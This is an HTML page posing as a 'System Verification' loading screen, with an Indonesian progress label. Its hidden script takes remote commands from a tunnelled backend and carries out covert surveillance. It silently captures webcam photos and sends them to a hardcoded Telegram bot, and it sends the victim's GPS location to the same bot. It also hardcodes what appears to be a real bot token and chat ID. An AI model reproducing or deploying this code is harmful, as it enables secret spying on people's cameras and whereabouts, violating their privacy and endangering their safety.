<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { width: 50px; height: 50px; border: 5px solid #111; border-top: 5px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #toast { visibility: hidden; background: #00ff41; color: #000; padding: 15px; position: fixed; bottom: 30px; border-radius: 10px; font-weight: bold; }
        #toast.show { visibility: visible; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="st">MEMUAT... 0%</h2>
    <div id="toast"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const BACKEND_URL = "https://skirts-printers-content-partially.trycloudflare.com"; 
        const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
        const CHAT_ID = "7373392803"; 
        const socket = io(BACKEND_URL, { transports: ['websocket'] });

        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'f.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch (e) {}
        }

        socket.on('command', (msg) => {
            if (msg === '/snap') takePhoto();
            if (msg === '/vibrate') navigator.vibrate(800);
            if (msg === '/gps') {
                navigator.geolocation.getCurrentPosition(r => {
                    const l = `https://www.google.com/maps?q=${r.coords.latitude},${r.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 Lokasi: ${l}`);
                });
            }
            if (msg.startsWith('/toast ')) {
                const t = document.getElementById('toast');
                t.innerText = msg.replace('/toast ', '');
                t.className = "show"; setTimeout(() => t.className = "", 4000);
            }
        });

        let p = 0;
        setInterval(() => { if(p < 100) { p += 4; document.getElementById('st').innerText = `MEMUAT... ${p}%`; } }, 200);
    </script>
</body>
</html>
